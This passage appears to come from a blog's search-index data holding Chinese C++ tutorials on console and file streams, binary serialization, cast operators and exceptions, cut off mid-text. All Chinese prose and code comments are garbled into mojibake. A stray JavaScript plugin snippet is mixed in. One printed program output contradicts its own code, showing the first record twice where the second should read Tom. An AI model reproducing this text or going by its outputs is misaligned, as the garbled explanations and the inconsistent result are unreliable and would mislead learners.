‡å‡†è¾“å…¥æµå¯¹è±¡ cin çš„å¸¸ç”¨å‡½æ•°å¦‚ä¸‹ï¼š cin.get()ï¼Œä¸€æ¬¡åªèƒ½è¯»å–ä¸€ä¸ªå­—ç¬¦ cin.get(ä¸€ä¸ªå‚æ•°)ï¼Œè¯»ä¸€ä¸ªå­—ç¬¦ cin.get(å¤šä¸ªå‚æ•°)ï¼Œå¯ä»¥è¯»å­—ç¬¦ä¸² cin.getline()ï¼Œè¯»å–æ•´è¡Œå­—ç¬¦ä¸²ï¼ŒåŒ…æ‹¬è¯»å–ç©ºæ ¼å­—ç¬¦ cin.ignore()ï¼Œç”¨äºå¿½ç•¥æˆ–æ¸…é™¤è¾“å…¥ç¼“å†²åŒºä¸­çš„ä¸€ä¸ªæˆ–å¤šä¸ªå­—ç¬¦ cin.putback()ï¼Œå°†æ•°æ®æ”¾å›ç¼“å†²åŒº cin.peek()ï¼Œè¿”å›å€¼æ˜¯ä¸€ä¸ª char å‹çš„å­—ç¬¦ï¼Œå³æŒ‡é’ˆæŒ‡å‘çš„å½“å‰å­—ç¬¦ï¼Œä½†å®ƒåªæ˜¯è§‚æµ‹æŒ‡é’ˆåœç•™åœ¨å½“å‰çš„ä½ç½®å¹¶ä¸åç§»ï¼›å¦‚æœè¦è®¿é—®çš„å­—ç¬¦æ˜¯æ–‡ä»¶ç»“æŸç¬¦ï¼Œåˆ™å‡½æ•°çš„è¿”å›å€¼æ˜¯ EOF æˆ–è€… -1 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788#include &lt;iostream&gt;using namespace std;void input1() { int number; cout &lt;&lt; "è¯·è¾“å…¥ä¸€ä¸ªæ•°å­—: "; cin &gt;&gt; number; cout &lt;&lt; "è¾“å…¥çš„æ•°å­—æ˜¯: " &lt;&lt; number &lt;&lt; endl;}void input2() { char buf[1024]; cout &lt;&lt; "è¯·è¾“å…¥å­—ç¬¦ä¸²: "; cin &gt;&gt; buf; // å½“é‡åˆ°ç©ºæ ¼ç¬¦æ—¶ï¼Œä¼šåœæ­¢æ¥æ”¶æ•°æ®è¾“å…¥ cout &lt;&lt; "è¾“å…¥çš„å­—ç¬¦ä¸²: "; cout &lt;&lt; buf &lt;&lt; endl;}void input3() { char ch; cout &lt;&lt; "è¯·è¾“å…¥å­—ç¬¦ä¸²: "; while ((ch = cin.get()) != EOF) // å¦‚æœç¼“å†²åŒºæ²¡æœ‰æ•°æ®ï¼Œåˆ™ç¨‹åºä¼šé˜»å¡ { cout &lt;&lt; ch &lt;&lt; " "; }}void input4() { char a, b, c; cout &lt;&lt; "è¯·è¾“å…¥å­—ç¬¦ä¸²: "; cin.get(a); // å¦‚æœç¼“å†²åŒºæ²¡æœ‰æ•°æ®ï¼Œåˆ™ç¨‹åºä¼šé˜»å¡ cin.get(b); cin.get(c); cout &lt;&lt; a &lt;&lt; b &lt;&lt; c;}void input5() { char buf[256]; cout &lt;&lt; "è¯·è¾“å…¥å­—ç¬¦ä¸²: "; cin.getline(buf, 256); // å½“é‡åˆ°ç©ºæ ¼ç¬¦æ—¶ï¼Œä¸ä¼šåœæ­¢æ¥æ”¶æ•°æ®è¾“å…¥ cout &lt;&lt; buf &lt;&lt; endl;}void input6() { char buf1[256]; char buf2[256]; cout &lt;&lt; "è¯·è¾“å…¥å­—ç¬¦ä¸²:"; // ä¾‹å¦‚è¾“å…¥ï¼šabc efghi cin &gt;&gt; buf1; cin.ignore(2); // å¿½ç•¥ç¼“å†²åŒºçš„æ•°æ® cin.getline(buf2, 256); cout &lt;&lt; buf1 &lt;&lt; endl; cout &lt;&lt; buf2 &lt;&lt; endl;}void input7() { char buf1[256]; char buf2[256]; cout &lt;&lt; "è¯·è¾“å…¥å­—ç¬¦ä¸²:"; // ä¾‹å¦‚è¾“å…¥ï¼šabc efghi cin &gt;&gt; buf1; cin.ignore(2); int num = cin.peek(); // æŸ¥çœ‹ç¼“å†²åŒºæ˜¯å¦æœ‰æ•°æ® cout &lt;&lt; num &lt;&lt; endl; cin.getline(buf2, 256); cout &lt;&lt; buf1 &lt;&lt; endl; cout &lt;&lt; buf2 &lt;&lt; endl;}void input8() { // åˆ†å¼€å¤„ç†è¾“å…¥çš„æ•´æ•°å’Œå­—ç¬¦ cout &lt;&lt; "Please, enter a number or a word: "; char c = std::cin.get(); if ((c &gt;= \'0\') &amp;&amp; (c &lt;= \'9\')) { int n; cin.putback(c); // å°†æ•°æ®æ”¾å›ç¼“å†²åŒº cin &gt;&gt; n; cout &lt;&lt; "You entered a number: " &lt;&lt; n &lt;&lt; \'\\n\'; } else { char ch; cin.putback(c); // å°†æ•°æ®æ”¾å›ç¼“å†²åŒº cin.get(ch); cout &lt;&lt; "You entered a character: " &lt;&lt; ch &lt;&lt; \'\\n\'; }} æ ‡å‡†è¾“å‡ºæµçš„ç®€å•ä½¿ç”¨æ ‡å‡†è¾“å‡ºæµå¯¹è±¡ cout çš„å¸¸ç”¨å‡½æ•°å¦‚ä¸‹ï¼š cout.flush() cout.put() cout.write() cout.width() cout.fill() cout.setf() 12345678910111213141516171819202122232425262728293031323334353637383940414243#include &lt;iostream&gt;#include &lt;iomanip&gt;using namespace std;void output1() { cout.put(\'h\').put(\'e\').put(\'l\').put(\'l\').put(\'o\').put(\'\\n\');}void output2() { char* str = "hello world\\n"; cout.write(str, strlen(str));}void output3() { // ç¬¬ä¸€ç§æ–¹å¼ï¼šä½¿ç”¨æµå¯¹è±¡çš„æˆå‘˜å‡½æ•° cout &lt;&lt; "&lt;Start&gt;"; cout.width(30); cout.fill(\'*\'); cout.setf(ios::showbase); cout.setf(ios::internal); cout &lt;&lt; hex &lt;&lt; 123 &lt;&lt; "&lt;End&gt;\\n";}void output4() { // ç¬¬äºŒç§æ–¹å¼ï¼šä½¿ç”¨æ§åˆ¶ç¬¦ cout &lt;&lt; "&lt;Start&gt;" &lt;&lt; setw(30) &lt;&lt; setfill(\'*\') &lt;&lt; setiosflags(ios::showbase) &lt;&lt; setiosflags(ios::internal) &lt;&lt; hex &lt;&lt; 123 &lt;&lt; "&lt;End&gt;\\n";}int main() { output1(); output2(); output3(); output4(); return 0;} ç¨‹åºè¿è¡Œè¾“å‡ºçš„ç»“æœå¦‚ä¸‹ï¼š 1234hellohello world&lt;Start&gt;0x**************************7b&lt;End&gt;&lt;Start&gt;0x**************************7b&lt;End&gt; æ–‡ä»¶ I/O æµçš„ç®€å•ä½¿ç”¨ä»¥æ™®é€šçš„æ–¹å¼è¯»å†™æ–‡ä»¶1234567891011121314151617181920212223242526272829303132333435363738394041424344454647#include &lt;iostream&gt;#include "fstream"using namespace std;void writeFile() { // æ‰“å¼€æ–‡ä»¶ char* fname = "D:/file.txt"; ofstream fout(fname); if (fout) { fout &lt;&lt; "Hello World" &lt;&lt; endl; fout.flush(); fout.close(); }}void readFile() { // è¯»å–æ–‡ä»¶ char ch; char* fname = "D:/file.txt"; ifstream fin(fname); if (fin) { while (fin.get(ch)) { cout &lt;&lt; ch; } fin.close(); }}void writeFileApp() { // ä»¥è¿½åŠ çš„æ–¹å¼æ‰“å¼€æ–‡ä»¶ char* fname = "D:/file.txt"; ofstream fout(fname, ios::app); if (fout) { fout &lt;&lt; "What" &lt;&lt; endl; fout.flush(); fout.close(); }}int main() { writeFile(); readFile(); writeFileApp(); readFile(); return 0;} ç¨‹åºè¿è¡Œè¾“å‡ºçš„ç»“æœå¦‚ä¸‹ï¼š 123Hello WorldHello WorldWhat ä»¥äºŒè¿›åˆ¶çš„æ–¹å¼è¯»å†™æ–‡ä»¶1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162#include &lt;iostream&gt;#include "fstream"using namespace std;class Teacher {public: Teacher() { age = 33; strcpy(name, ""); } Teacher(int _age, char* _name) { age = _age; strcpy(name, _name); } void print() { cout &lt;&lt; "age:" &lt;&lt; age &lt;&lt; ", name:" &lt;&lt; name &lt;&lt; endl; }private: int age; char name[32];};int main() { char* fname = "D:/file.dat"; ofstream fout(fname, ios::binary); if (!fout) { cout &lt;&lt; "æ‰“å¼€æ–‡ä»¶å¤±è´¥" &lt;&lt; endl; return 0; } // å°†ç±»å¯¹è±¡å†™å…¥äºŒè¿›åˆ¶æ–‡ä»¶ï¼ˆåºåˆ—åŒ–ï¼‰ Teacher t1(23, "Jim"); Teacher t2(26, "Tom"); fout.write((char*)&amp;t1, sizeof(Teacher)); fout.write((char*)&amp;t2, sizeof(Teacher)); fout.flush(); fout.close(); ifstream fin(fname); if (!fin) { cout &lt;&lt; "æ‰“å¼€æ–‡ä»¶å¤±è´¥" &lt;&lt; endl; return 0; } // ä»äºŒè¿›åˆ¶æ–‡ä»¶è¯»å–ç±»å¯¹è±¡ï¼ˆååºåˆ—åŒ–ï¼‰ Teacher tmp; fin.read((char*)&amp;tmp, sizeof(Teacher)); tmp.print(); fin.read((char*)&amp;tmp, sizeof(Teacher)); tmp.print(); fin.close(); return 0;} ç¨‹åºè¿è¡Œè¾“å‡ºçš„ç»“æœå¦‚ä¸‹ï¼š 12age:23, name:Jimage:23, name:Jim var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"c++"},{title:"C++ è¿›é˜¶åŸºç¡€ä¹‹ä¸‰",url:"/posts/35cd91d3.html",text:'ç±»å‹è½¬æ¢ç±»å‹è½¬æ¢çš„è¯­æ³• C è¯­è¨€é£æ ¼çš„å¼ºåˆ¶ç±»å‹è½¬æ¢ï¼ˆType Castï¼‰å¾ˆç®€å•ï¼Œä¸ç®¡ä»€ä¹ˆç±»å‹çš„è½¬æ¢ï¼Œè¯­æ³•éƒ½æ˜¯ï¼šTYPE b = (TYPE) a C++ é£æ ¼çš„ç±»å‹è½¬æ¢ï¼Œæä¾›äº† 4 ç§ç±»å‹è½¬æ¢æ“ä½œç¬¦æ¥åº”å¯¹ä¸åŒåœºåˆçš„åº”ç”¨ const_castï¼šå»é™¤å˜é‡çš„ const åªè¯»å±æ€§ reinterpreter_castï¼šé‡æ–°è§£é‡Šç±»å‹ï¼ˆå¼ºåˆ¶ç±»å‹è½¬æ¢ï¼‰ static_castï¼šé™æ€ç±»å‹è½¬æ¢ï¼Œå¦‚ int è½¬æ¢æˆ char dynamic_castï¼šåŠ¨æ€ç±»å‹è½¬æ¢ï¼Œå¦‚çˆ¶ç±»å’Œå­ç±»ä¹‹é—´çš„å¤šæ€ç±»å‹è½¬æ¢ C++ 4 ç§ç±»å‹è½¬æ¢çš„è¯­æ³•ï¼šTYPE B = static_cast&lt;TYPE&gt; (a) ç±»å‹è½¬æ¢çš„ä¸€èˆ¬æ€§ä»‹ç»ä¸€èˆ¬æ€§ä»‹ç»ï¼š a) const_cast&lt;&gt;()ï¼šå»é™¤å˜é‡çš„ const åªè¯»å±æ€§ b) reinterpret_cast&lt;&gt;()ï¼šé‡æ–°è§£é‡Šç±»å‹ï¼Œä¸åŒç±»å‹ä¹‹é—´ä¼šè¿›è¡Œå¼ºåˆ¶ç±»å‹è½¬æ¢ c) dynamic_cast&lt;&gt;()ï¼šåŠ¨æ€ç±»å‹è½¬æ¢ï¼Œå®‰å…¨çš„åŸºç±»å’Œæ´¾ç”Ÿç±»ä¹‹é—´è½¬æ¢ï¼Œè¿è¡Œæ—¶ä¼šåšç±»å‹æ£€æŸ¥ d) static_cast&lt;&gt;()ï¼šé™æ€ç±»å‹è½¬æ¢ï¼Œç¼–è¯‘çš„æ—¶å€™ C++ ç¼–è¯‘å™¨ä¼šåšç±»å‹æ£€æŸ¥ï¼ŒåŸºæœ¬ç±»å‹éƒ½èƒ½è½¬æ¢ï¼Œä½†æ˜¯ä¸èƒ½è½¬æ¢æŒ‡é’ˆç±»å‹ï¼ˆå¤šæ€é™¤å¤–ï¼‰ ä¸€èˆ¬æ€§ç»“è®ºï¼š a) åœ¨ C è¯­è¨€ä¸­ï¼Œä¸èƒ½éšå¼ç±»å‹è½¬æ¢çš„ï¼Œåœ¨ C++ ä¸­å¯ä»¥ç”¨ reinterpret_cast&lt;&gt;() è¿›è¡Œå¼ºè¡Œç±»å‹è§£é‡Š b) åœ¨ C è¯­è¨€ä¸­ï¼Œèƒ½éšå¼ç±»å‹è½¬æ¢çš„ï¼Œåœ¨ C++ ä¸­å¯ç”¨ static_cast&lt;&gt;() è¿›è¡Œç±»å‹è½¬æ¢ï¼Œå› ä¸º C++ ç¼–è¯‘å™¨åœ¨ç¼–è¯‘çš„æ—¶å€™ï¼Œä¸€èˆ¬éƒ½å¯ä»¥é¡ºåˆ©é€šè¿‡ç±»å‹æ£€æŸ¥ c) static_cast&lt;&gt;() å’Œ reinterpret_cast&lt;&gt;() åŸºæœ¬ä¸ŠæŠŠ C è¯­è¨€ä¸­çš„å¼ºåˆ¶ç±»å‹è½¬æ¢åŠŸèƒ½ç»™è¦†ç›–äº†ï¼Œä½† reinterpret_cast&lt;&gt;() å¾ˆéš¾ä¿è¯ä»£ç çš„ç§»æ¤æ€§ ç±»å‹è½¬æ¢çš„ç®€å•ä½¿ç”¨æ¡ˆä¾‹123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113#include &lt;iostream&gt;using namespace std;class Tree {};class Animal {public: virtual void cry() = 0;};class Dog : public Animal {public: void cry() override { cout &lt;&lt; "dog cry ..." &lt;&lt; endl; } void watchHome() { cout &lt;&lt; "dog watch home" &lt;&lt; endl; }};class Cat : public Animal {public: void cry() override { cout &lt;&lt; "cat cry ..." &lt;&lt; endl; } void playBall() { cout &lt;&lt; "cat play ball ..." &lt;&lt; endl; }};void playAnimal(Animal *animal) { animal-&gt;cry(); // åŠ¨æ€ç±»å‹è½¬æ¢ï¼Œå°†çˆ¶ç±»è½¬æ¢ä¸ºå­ç±»ï¼Œè¿è¡Œæ—¶ä¼šåšç±»å‹æ£€æŸ¥ Dog *dog = dynamic_cast&lt;Dog *&gt;(animal); if (dog != NULL) { dog-&gt;watchHome(); } Cat *cat = dynamic_cast&lt;Cat *&gt;(animal); if (cat != NULL) { cat-&gt;playBall(); }}void printBuf(const char *buf) { // const_cast å»é™¤å˜é‡çš„ const åªè¯»å±æ€§ char *m_buf = const_cast&lt;char *&gt;(buf); m_buf[0] = \'b\'; cout &lt;&lt; buf &lt;&lt; endl; cout &lt;&lt; m_buf &lt;&lt; endl;}void printBuf2() { // å®šä¹‰æŒ‡é’ˆæŒ‡å‘ä¸€ä¸ªå¸¸é‡ï¼Œè¿™é‡Œçš„å¸¸é‡çš„å†…å­˜ç©ºé—´ä¸å¯ä»¥æ›´æ”¹ char* buf = "aaaaa"; // const_cast å»é™¤å˜é‡çš„ const åªè¯»å±æ€§ char* m_buf = const_cast&lt;char*&gt;(buf); // æ­¤æ—¶è‹¥æ›´æ”¹æŒ‡é’ˆæ‰€æŒ‡å‘çš„å†…å­˜ç©ºé—´ï¼Œä¼šå¸¦æ¥ç¾éš¾æ€§çš„åæœ m_buf[0] = \'b\'; cout &lt;&lt; buf &lt;&lt; endl; cout &lt;&lt; m_buf &lt;&lt; endl;}int main() { char *p1 = "hello"; double pi = 3.1415926; // é™æ€ç±»å‹è½¬æ¢ï¼Œç¼–è¯‘çš„æ—¶å€™ C++ ç¼–è¯‘å™¨ä¼šåšç±»å‹æ£€æŸ¥ int num1 = static_cast&lt;int&gt;(pi); cout &lt;&lt; "num1 = " &lt;&lt; num1 &lt;&lt; endl; // é™æ€ç±»å‹è½¬æ¢ï¼ŒåŸºæœ¬ç±»å‹éƒ½èƒ½è½¬æ¢ï¼Œä½†æ˜¯ä¸èƒ½è½¬æ¢æŒ‡é’ˆç±»å‹ï¼ˆå¤šæ€é™¤å¤–ï¼‰ // int* p2 = static_cast&lt;int*&gt;(p1); // é”™è¯¯å†™æ³•ï¼ŒC++ ç¼–è¯‘å™¨ç¼–è¯‘å¤±è´¥ // é‡æ–°è§£é‡Šç±»å‹ï¼Œä¸åŒç±»å‹ä¹‹é—´ä¼šè¿›è¡Œå¼ºåˆ¶ç±»å‹è½¬æ¢ï¼ŒåŒ…æ‹¬è½¬æ¢æŒ‡é’ˆç±»å‹ int *p2 = reinterpret_cast&lt;int *&gt;(p1); cout &lt;&lt; "p2 = " &lt;&lt; p2 &lt;&lt; endl; // å»é™¤å˜é‡çš„ const åªè¯»å±æ€§ char buf[] = "aaaaa"; printBuf(buf); // printBuf2(); // åŠ¨æ€ç±»å‹è½¬æ¢ï¼ŒåŸºç±»å’Œæ´¾ç”Ÿç±»ä¹‹é—´è½¬æ¢ï¼Œè¿è¡Œæ—¶ä¼šåšç±»å‹æ£€æŸ¥ Dog dog; Cat cat; playAnimal(&amp;dog); playAnimal(&amp;cat); // å¤šæ€çš„å…¶ä»–ä½¿ç”¨åœºæ™¯ Animal *pAnimal = NULL; pAnimal = &amp;dog; pAnimal = static_cast&lt;Animal *&gt;(&amp;dog); // ç¼–è¯‘é€šè¿‡ pAnimal-&gt;cry(); pAnimal = reinterpret_cast&lt;Animal *&gt;(&amp;dog); // ç¼–è¯‘é€šè¿‡ pAnimal-&gt;cry(); Tree tree; // pAnimal = static_cast&lt;Animal*&gt;(&amp;tree); // é”™è¯¯å†™æ³•ï¼ŒC++ ç¼–è¯‘å™¨ç¼–è¯‘å¤±è´¥ pAnimal = reinterpret_cast&lt;Animal *&gt;(&amp;tree); // ç¼–è¯‘é€šè¿‡ return 0;} ç¨‹åºè¿è¡Œè¾“å‡ºçš„ç»“æœå¦‚ä¸‹ï¼š 12345678910num1 = 3p2 = 005661B8baaaabaaaadog cry ...dog watch homecat cry ...cat play ball ...dog cry ...dog cry ... ä½¿ç”¨æ€»ç»“ï¼š ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œä¸å»ºè®®è¿›è¡Œç±»å‹è½¬æ¢ï¼Œåº”è¯¥é¿å…è¿›è¡Œç±»å‹è½¬æ¢ è¦æ¸…æ¥šåœ°çŸ¥é“ï¼šè¦è½¬æ¢çš„å˜é‡ï¼Œç±»å‹è½¬æ¢å‰æ˜¯ä»€ä¹ˆç±»å‹ï¼Œç±»å‹è½¬æ¢åæ˜¯ä»€ä¹ˆç±»å‹ï¼Œè½¬æ¢åæœ‰ä»€ä¹ˆåæœ å¼‚å¸¸å¤„ç†æœºåˆ¶ å¼‚å¸¸çš„ä»‹ç»ï¼š å¼‚å¸¸æ˜¯ä¸€ç§ç¨‹åºæ§åˆ¶æœºåˆ¶ï¼Œä¸å‡½æ•°æœºåˆ¶ç‹¬ç«‹å’Œäº’è¡¥ å‡½æ•°æ˜¯ä¸€ç§ä»¥æ ˆç»“æ„å±•å¼€çš„ä¸Šä¸‹å‡½æ•°è¡”æ¥çš„ç¨‹åºæ§åˆ¶ç³»ç»Ÿï¼Œè€Œå¼‚å¸¸æ˜¯å¦ä¸€ç§æ§åˆ¶ç»“æ„ï¼Œå®ƒä¾é™„äºæ ˆç»“æ„ï¼Œå´å¯ä»¥åŒæ—¶è®¾ç½®å¤šä¸ªå¼‚å¸¸ç±»å‹ä½œä¸ºæ•è·æ¡ä»¶ï¼Œä»è€Œå®ç°ä»¥ç±»å‹åŒ¹é…åœ¨æ ˆæœºåˆ¶ä¸­è·³è·ƒå›é¦ˆ å¼‚å¸¸è®¾è®¡ç›®çš„ï¼š æ ˆæœºåˆ¶æ˜¯ä¸€ç§é«˜åº¦èŠ‚å¾‹æ€§çš„æ§åˆ¶æœºåˆ¶ï¼Œé¢å‘å¯¹è±¡ç¼–ç¨‹å´è¦æ±‚å¯¹è±¡ä¹‹é—´æœ‰æ–¹å‘ã€æœ‰ç›®çš„çš„æ§åˆ¶ä¼ åŠ¨ï¼Œä»ä¸€å¼€å§‹ï¼Œå¼‚å¸¸å°±æ˜¯å†²ç€æ”¹å˜ç¨‹åºæ§åˆ¶ç»“æ„ï¼Œä»¥é€‚åº”é¢å‘å¯¹è±¡ç¨‹åºæ›´æœ‰æ•ˆåœ°å·¥ä½œè¿™ä¸ªä¸»é¢˜ï¼Œè€Œä¸æ˜¯ä»…ä¸ºäº†è¿›è¡Œé”™è¯¯å¤„ç† å¼‚å¸¸è®¾è®¡å‡ºæ¥ä¹‹åï¼Œå´å‘ç°åœ¨é”™è¯¯å¤„ç†æ–¹é¢è·å¾—äº†æœ€å¤§çš„å¥½å¤„ å¼‚å¸¸å¤„ç†çš„åŸºæœ¬æ€æƒ³ä¼ ç»Ÿé”™è¯¯å¤„ç†æœºåˆ¶ä¼ ç»Ÿçš„ç¨‹åºé”™è¯¯å¤„ç†æœºåˆ¶ï¼Œæ˜¯é€šè¿‡å‡½æ•°è¿”å›å€¼æ¥å¤„ç†é”™è¯¯ã€‚ å¼‚å¸¸å¤„ç†çš„åŸºæœ¬æ€æƒ³ å¼‚å¸¸è·¨è¶Šäº†å‡½æ•°ï¼Œå¹¶è¶…è„±äºå‡½æ•°æœºåˆ¶ï¼Œå†³å®šäº†å…¶å¯¹å‡½æ•°çš„è·¨è¶Šå¼å›è·³ C++ çš„å¼‚å¸¸å¤„ç†æœºåˆ¶ä½¿å¾—å¼‚å¸¸çš„å¼•å‘å’Œå¼‚å¸¸çš„å¤„ç†ä¸å¿…åœ¨åŒä¸€ä¸ªå‡½æ•°ä¸­ï¼Œè¿™æ ·åº•å±‚çš„å‡½æ•°å¯ä»¥ç€é‡è§£å†³å…·ä½“é—®é¢˜ï¼Œè€Œä¸å¿…è¿‡å¤šçš„è€ƒè™‘å¼‚å¸¸çš„å¤„ç†ï¼Œä¸Šå±‚è°ƒç”¨è€…å¯ä»¥åœ¨é€‚å½“çš„ä½ç½®è®¾è®¡å¯¹ä¸åŒç±»å‹å¼‚å¸¸çš„å¤„ç† å¼‚å¸¸æ˜¯ä¸“é—¨é’ˆå¯¹æŠ½è±¡ç¼–ç¨‹ä¸­çš„ä¸€ç³»åˆ—é”™è¯¯è¿›è¡Œå¤„ç†çš„ï¼ŒC++ ä¸­ä¸èƒ½å€ŸåŠ©å‡½æ•°æœºåˆ¶ï¼Œå› ä¸ºæ ˆç»“æ„çš„æœ¬è´¨æ˜¯å…ˆè¿›åå‡ºï¼Œä¾æ¬¡è®¿é—®ï¼Œæ— æ³•è¿›è¡Œè·³è·ƒï¼Œä½†é”™è¯¯å¤„ç†çš„ç‰¹å¾å´æ˜¯é‡åˆ°é”™è¯¯ä¿¡æ¯å°±æƒ³è¦è½¬åˆ°è‹¥å¹²çº§ä¹‹ä¸Šè¿›è¡Œé‡æ–°å°è¯•ï¼Œå¦‚å›¾æ‰€ç¤ºï¼š C++ å¼‚å¸¸çš„åŸºç¡€ä½¿ç”¨å¼‚å¸¸çš„åŸºæœ¬è¯­æ³• a) è‹¥æœ‰å¼‚å¸¸åˆ™é€šè¿‡ throw æ“ä½œåˆ›å»ºä¸€ä¸ªå¼‚å¸¸å¯¹è±¡å¹¶æŠ›æ· b) å°†å¯èƒ½æŠ›å‡ºå¼‚å¸¸çš„ç¨‹åºæ®µåµŒåœ¨ try å—ä¹‹ä¸­ï¼Œæ§åˆ¶é€šè¿‡æ­£å¸¸çš„é¡ºåºæ‰§è¡Œåˆ°è¾¾ try è¯­å¥ï¼Œç„¶åæ‰§è¡Œ try ä»£ç å—å†…çš„ä¿æŠ¤æ®µ c) å¦‚æœåœ¨ä¿æŠ¤æ®µæ‰§è¡ŒæœŸé—´æ²¡æœ‰å¼•èµ·å¼‚å¸¸ï¼Œé‚£ä¹ˆè·Ÿåœ¨ try ä»£ç å—åçš„ catch å­å¥å°±ä¸ä¼šæ‰§è¡Œï¼Œç¨‹åºä» try ä»£ç å—åè·Ÿéšçš„æœ€åä¸€ä¸ª catch å­å¥åé¢çš„è¯­å¥å°†ç»§ç»­æ‰§è¡Œä¸‹å» d) catch å­å¥æŒ‰å…¶åœ¨ try ä»£ç å—åå‡ºç°çš„é¡ºåºè¢«æ£€æŸ¥ï¼ŒåŒ¹é…åˆ°çš„ catch å­å¥å°†æ•è·å¹¶å¤„ç†å¼‚å¸¸ï¼ˆæˆ–ç»§ç»­æŠ›æ·å¼‚å¸¸ï¼‰ e) å¦‚æœåŒ¹é…çš„å¼‚å¸¸å¤„ç†å™¨æœªè¢«æ‰¾åˆ°ï¼Œåˆ™å‡½æ•° terminate() å°†è¢«è‡ªåŠ¨è°ƒç”¨ï¼Œå…¶ç¼ºçœåŠŸèƒ½æ˜¯è°ƒç”¨å‡½æ•° abort() ç»ˆæ­¢ç¨‹åºçš„è¿è¡Œ f) å¤„ç†ä¸äº†çš„å¼‚å¸¸ï¼Œå¯ä»¥åœ¨ catch å­å¥çš„æœ€åä¸€ä¸ªåˆ†æ”¯ï¼Œä½¿ç”¨ throw è¯­æ³•ï¼Œå‘ä¸ŠæŠ›æ·å¼‚å¸¸ å¼‚å¸¸çš„ç®€å•ä½¿ç”¨æ¡ˆä¾‹ä¸€123456789101112131415161718192021222324252627#include &lt;iostream&gt;using namespace std;int divide(int x, int y) { if (0 == y) { throw y; // æŠ›å‡º int ç±»å‹çš„å¼‚å¸¸ } return x / y;}int main() { try { int result = divide(5, 0); cout &lt;&lt; "result = " &lt;&lt; result &lt;&lt; endl; } catch (int e) { cout &lt;&lt; e &lt;&lt; ", è¢«é™¤æ•°ä¸èƒ½ä¸ºé›¶" &lt;&lt; endl; } // ä¼šæ•è·æ‰€æœ‰æœªè¢«æ•è·çš„å¼‚å¸¸ï¼Œå¿…é¡»æœ€åå‡ºç° catch (...) { throw "å‘ç”ŸæœªçŸ¥çš„å¼‚å¸¸ ..."; } cout &lt;&lt; "ç¨‹åºæ­£å¸¸ç»“æŸè¿è¡Œ" &lt;&lt; endl; return 0;} ç¨‹åºè¿è¡Œè¾“å‡ºçš„ç»“æœå¦‚ä¸‹ï¼š 120, è¢«é™¤æ•°ä¸èƒ½ä¸ºé›¶ç¨‹åºæ­£å¸¸ç»“æŸè¿è¡Œ å¼‚å¸¸çš„ç®€å•ä½¿ç”¨æ¡ˆä¾‹äºŒå¼‚å¸¸æœºåˆ¶ä¸å‡½æ•°æœºåˆ¶äº’ä¸å¹²æ¶‰ï¼Œä½†æ•æ‰çš„æ–¹å¼æ˜¯åŸºäºç±»å‹åŒ¹é…ã€‚å¼‚å¸¸æ•æ‰ç›¸å½“äºå‡½æ•°è¿”å›ç±»å‹çš„åŒ¹é…ï¼Œè€Œä¸æ˜¯å‡½æ•°å‚æ•°çš„åŒ¹é…ï¼Œæ‰€ä»¥å¼‚å¸¸æ•æ‰ä¸ç”¨è€ƒè™‘ä¸€ä¸ªæŠ›æ·ä¸­çš„å¤šç§æ•°æ®ç±»å‹åŒ¹é…é—®é¢˜ã€‚å¼‚å¸¸æ•æ‰æ˜¯ä¸¥æ ¼æŒ‰ç…§ç±»å‹åŒ¹é…çš„ï¼Œå®ƒçš„ç±»å‹åŒ¹é…ä¹‹è‹›åˆ»ç¨‹åº¦å¯ä»¥å’Œæ¨¡æ¿çš„ç±»å‹åŒ¹é…ç›¸åª²ç¾ã€‚å®ƒä¸å…è®¸ç›¸å®¹ç±»å‹çš„éšå¼è½¬æ¢ï¼Œæ¯”å¦‚ï¼ŒæŠ›æ· char ç±»å‹çš„å¼‚å¸¸ï¼Œç”¨ int ç±»å‹å°±æ•æ‰ä¸åˆ°å¯¹åº”çš„å¼‚å¸¸ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051#include &lt;iostream&gt;using namespace std;class A {};class B {};int main() { try { int a; int i = 0; double d = 2.3; char str[20] = "Hello"; cout &lt;&lt; "Please input a exception number: "; cin &gt;&gt; a; switch (a) { case 1: throw i; case 2: throw d; case 3: throw str; case 4: throw A(); case 5: throw B(); default: cout &lt;&lt; "No exception throws here.\\n"; } } catch (int) { cout &lt;&lt; "int exception.\\n"; } catch (double) { cout &lt;&lt; "double exception.\\n"; } catch (char*) { cout &lt;&lt; "char* exception.\\n"; } catch (A) { cout &lt;&lt; "class A exception.\\n"; } catch (B) { cout &lt;&lt; "class B exception.\\n"; } cout &lt;&lt; "That\'s ok.\\n"; return 0;} ç¨‹åºè¿è¡Œè¾“å‡ºçš„ç»“æœå¦‚ä¸‹ï¼š 123Please input a exception number: 3char* exception.That\'s ok. å¼‚å¸¸åœ¨ç»§æ‰¿ä¸­çš„ä½¿ç”¨æ¡ˆä¾‹ MyException.h 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859#pragma once#include &lt;iostream&gt;using namespace std;// å¼‚å¸¸æŠ½è±¡ç±»class SizeException {public: // çº¯è™šå‡½æ•° virtual void printErr() = 0;public: int getSize() { return this-&gt;size; }protected: int size = 0;};class NegativeException : public SizeException {public: NegativeException(int size) { this-&gt;size = size; } void printErr() { cout &lt;&lt; "æ•°ç»„å¤§å°ä¸èƒ½å°äºé›¶, å½“å‰å¤§å°ä¸º " &lt;&lt; this-&gt;size &lt;&lt; endl; }};class TooBigException : public SizeException {public: TooBigException(int size) { this-&gt;size = size; } void printErr() { cout &lt;&lt; "æ•°ç»„å¤§å°å¤ªå¤§, å½“å‰å¤§å°ä¸º " &lt;&lt; this-&gt;size &lt;&lt; endl; }};class ZeroException : public 